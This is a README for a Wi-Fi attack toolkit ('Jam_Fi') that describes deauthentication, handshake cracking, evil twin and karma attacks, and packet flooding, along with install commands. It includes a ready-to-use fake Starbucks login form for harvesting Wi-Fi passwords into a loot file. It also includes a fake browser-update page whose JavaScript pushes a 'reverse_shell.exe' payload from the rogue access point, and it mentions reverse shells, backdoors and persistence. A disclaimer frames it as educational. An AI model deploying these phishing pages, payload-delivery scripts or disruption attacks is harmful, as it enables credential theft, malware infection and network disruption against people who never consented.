# 💜 Jam_Fi – Wi-Fi Chaos Tool  
by [@ekomsSavior](https://github.com/ekomsSavior)

> Built with love to teach, explore, and cause a little friendly Wi-Fi mischief. 💅

---

![image3](https://github.com/user-attachments/assets/960cce0f-7854-4080-b977-b0a02fb34418)


## ✨ What is Jam_Fi?

Jam_Fi is a powerful and playful Wi-Fi chaos and red teaming toolkit written in Python for Kali Linux. 
It's designed for educational and cybersecurity research purposes, helping you learn how attackers exploit wireless networks—and how to defend against them.

Jam_Fi includes tools for:

- Evil Twin Access Points ☠️  
- Deauthentication Attacks 💥  
- Handshake Capture & Cracking 🔓  
- Probe Request & Junk Flooding 📡  
- Karma Attacks 🧲  
- MITM HID Injection 💻  
- Fake Login Phishing with Auto-Logging 📄  
- and more...

Whether you're a beginner or advanced user, Jam_Fi gives you a hands-on way to experiment and learn in a lab setting.

---

## 🛠️ Installation

1. Clone the repo:

git clone https://github.com/ekomsSavior/Jam_Fi.git

cd Jam_Fi

Make sure you have the following installed:

sudo apt update

sudo apt install -y aircrack-ng hostapd dnsmasq dnsspoof python3-scapy

Run the tool:

sudo python3 jam_fi.py

*To Update periodically:

run from the Jam_fi directory on your machine:

git pull

----------------------------------------------------------------

## When Jam_fi is running you'll see:

🔹 1  Scan Clients & APs 🔍
     → Scans for nearby Wi-Fi networks (Access Points) and the clients connected to them using Scapy.

🔹 2  Deauth One Client 💥
     → Sends a deauthentication attack to disconnect a selected client from their Wi-Fi (uses scapy).

🔹 3  Deauth ALL Clients + Capture 🔓
     → Disconnects all clients from known APs and tries to capture WPA/WPA2 handshake packets.

🔹 4  Crack Captured Handshakes 🔓
     → Tries to crack saved WPA handshakes using Aircrack-ng or Hashcat if installed.

🔹 5  Probe Request Spam 📡
     → Broadcasts fake SSIDs as if clients are looking for networks, to create wireless noise.

🔹 6  Junk Packet Flood 💣
     → Sends randomized packets with fake MAC addresses to flood the airwaves and confuse devices.

🔹 7  Karma Responder 🧲
     → Responds to any probe request with a beacon frame, tricking devices into connecting.

🔹 8  Chaos Mode 💃
     → Combo mode! Runs Karma Responder, Junk Flood, and Probe Spam all at once.

🔹 9  View Loot 📁
     → Displays any saved handshakes, captured credentials, or other loot collected in the `loot/` folder.

🔹 🔟 Evil AP 👿
     → Launches a fully connectable Evil Twin Access Point with DNS redirection and phishing login page.

🔹 11 MITM HID Injection 🧠
     → Simulates a man-in-the-middle attack by redirecting users to a fake “driver install” page with mock keystroke injection.

🔹 0  Quit ❌
     → Exits JamFi and returns to your terminal.

--------------------------------------------------------------------------------------------------------------------     

## ✨✨✨ Tips & Tricks for Power Users ✨✨✨
Jam_Fi was made to be playful, powerful, and personal. Here's how you can take your JamFi chaos to the next level:

⚡ Performance Tips

💻 Optimize Wireless Interface:

Use an ALFA AWUS1900 or AWUS036ACH for better packet injection and monitoring.

Disable power-saving on your adapter:

sudo iw dev wlan0 set power_save off

Switch channels manually with:

iwconfig wlan0 channel 6
(Replace with the target AP’s channel for better deauth or handshake captures.)

📡 Make Scans Faster:

Edit the scan delay inside jam_fi.py (look for time.sleep() under channel_hopper()).

Lowering sleep delay to 0.2 or less can speed things up, but may increase CPU usage.

--------------------------------------------------------------------------------------------------------------------

👿 Evil AP Customization
🎨 Customize the Captive Portal

Edit this file to make your own fake login page:

loot/login.html

Wanna make it look like Starbucks? Just change the login.html body like this

```html
<h2>Welcome to Starbucks Free Wi-Fi</h2>
<p>Please sign in to continue</p>
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Email"><br>
  <input type="password" name="password" placeholder="Wi-Fi Password"><br>
  <input type="submit" value="Connect">
</form>
```

You can view your collected credentials in:

loot/creds.txt

-------------------------------------------------------------------------------------------------------------------

🔐 **Advanced Hack: Fake Browser Update + Payload (Optional)**  
JamFi lets you simulate a fake browser update prompt using pure HTML + JavaScript — no Flipper or Rubber Ducky required!

Once a device connects to your Evil AP, redirect them to a custom update page by editing:  
`loot/injection.html`

Here’s a simple example:

```html
<!-- loot/injection.html -->
<h2>🔒 Browser Update Required</h2>
<p>To continue browsing, please install the latest security patch.</p>
<button onclick="downloadUpdate()">Update Now</button>

<script>
function downloadUpdate() {
  const a = document.createElement('a');
  a.href = 'http://10.0.0.1/fake_update.exe';  // Customize your payload here
  a.download = 'update.exe';
  document.body.appendChild(a);
  a.click();
}
</script>
```

Just place your payload (like `reverse_shell.exe`) in the `loot/` folder and it will auto-download when the user clicks "Update Now".

You now have a simulated Remote Code Execution (RCE) opportunity: if the victim downloads and runs the file, you can trigger reverse shells, backdoors, or persistence depending on your setup.

⚠️ JamFi does not include any malicious payloads — it's up to you to create safe, controlled experiments in your own lab. This is where red teamers, CTF lovers, and students can shine.

--------------------------------------------------------------------------------------------------------------------------------

## 💼 The loot/ Folder

This folder contains all the important config and phishing assets used by Evil AP and MITM modes:

File	Purpose

index.html	The default captive portal or phishing homepage

login.html	Fake login page that logs entered usernames & passwords

phish_server.py	Hosts the phishing server & saves form data to creds.txt

creds.txt	Stores submitted login form credentials (auto-created)

hostapd.conf	Used to configure and start the Evil Access Point

dnsmasq.conf	Handles DHCP and DNS for the Evil AP

dnsspoof_hosts	Used by dnsspoof to redirect all DNS to the attacker

hotspot-detect.html	Helps trigger captive portal on iOS/macOS devices

injection.html	Used for MITM HID payload simulation (fake keystroke browser page)

All of these files are auto-generated if missing, so don’t stress if you delete them!

----------------------------------------------------------------------------------

## 🚨 Disclaimer

This tool is for educational and authorized research only.

By using Jam_Fi, you agree that you are responsible for your own actions.

Do not use this tool on networks or devices you don’t have explicit permission to test.

The goal is to educate and empower—not to harm. Use wisely 💜

---------------------------------------------------------------------------------------------

## 💜 Built With Love

Jam_Fi is a passion project created by @ekomsSavior xoxoxoox sending hugs to all the homies always ✨✨✨

It’s free, open-source, and meant to make learning cybersecurity hands-on, fun, and inclusive for all.

If you like Jam_Fi, give it a ⭐️ on GitHub and share it with your h4x0r and cybersecurity friends!

